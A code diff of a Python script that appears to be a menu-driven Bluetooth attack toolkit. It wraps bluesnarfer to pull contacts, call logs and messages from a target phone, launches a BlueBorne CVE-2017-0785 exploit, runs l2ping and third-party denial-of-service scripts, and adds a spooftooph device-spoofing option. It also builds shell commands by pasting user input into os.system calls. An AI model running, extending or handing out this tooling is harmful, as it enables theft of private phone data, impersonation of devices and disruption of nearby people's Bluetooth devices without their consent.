@@ -36,12 +36,12 @@ def sdptool():
     os.system("sudo sdptool -i " + hci + " browse --tree --l2cap " + mac + " > target_" + mac + ".log")
     os.system("sudo cat target_" + mac + ".log")
 
-def bluesnarfer_setup():
+def bluesnarferSetup():
     subprocess.run(["sudo", "mkdir", "-p", "/dev/bluetooth/rfcomm"], stdout=subprocess.DEVNULL)
     subprocess.run(["sudo", "mknod", "-m", "666", "/dev/bluetooth/rfcomm/0", "c", "216", "0"], stdout=subprocess.DEVNULL)
 
 def bluesnarfer(mode):
-    bluesnarfer_setup()
+    bluesnarferSetup()
     mac = input("\n\nWrite target MAC address: ")
     mc = input("Write target channel for messages: ")
     pbc = input("Write target channel for phone book: ")
@@ -66,13 +66,21 @@ def blueborne():
     mac = input("Write target MAC address: ")
     os.system("sudo python3 CVE-2017-0785.py TARGET=" + mac)
 
+#Custom DoS, not functional, use 100 and 600 for default values
 def DoS(seq, size):
     mac = input("Write target MAC address: ")
     os.system("sudo seq " + str(seq) + " > numberofpings")
     os.system("while read r; do l2ping -s " + str(size) + " " + mac + "; done < numberofpings")
 
-def jieggi_DoS():
+def jieggiDoS():
     os.system("sudo python3 ./BLUETOOTH-DOS-ATTACK.py")
+
+def spoofing(mode):
+    if 'random' in mode:
+        os.system("sudo spooftooph -i " + hci + " -R")
+    elif 'interval' in mode:
+        interval = input("\n\nWrite interval to spoof nearby devices: ")
+        subprocess.run(["sudo", "spooftooph", "-i", hci, "-t", interval], stdout=subprocess.DEVNULL)
 
 def welcome():
     print("\n\n")
@@ -87,7 +95,7 @@ def menu():
     print("5- DoS attack. Powered by jieggil script.")
     print("6- Bluesnarfing attack. Powered by Bluesnarfer")
     print("7- Blueborne CVE for android.")
-    print("8- DoS attack, the sequel.")
+    print("8- Random Spoofing. Powered by spooftooph.")
 
 def bye():
     print("\n\n")
@@ -109,14 +117,15 @@ def main():
         elif "4" in action:
             sdptool()
         elif "5" in action:
-            jieggi_DoS()
+            jieggiDoS()
         elif "6" in action:
             mode = input("\n\nChoose bluesnarfer action (list, contacts, calls or info): ")
             bluesnarfer(mode)
         elif "7" in action:
             blueborne()
         elif "8" in action:
-            DoS(100, 600)
+            mode = input("\n\nChoose Spoofing action (random to generate random info or nearby to clone interval devices): ")
+            spoofing(mode)
         elif "quit" in action:
             bye()
         else:
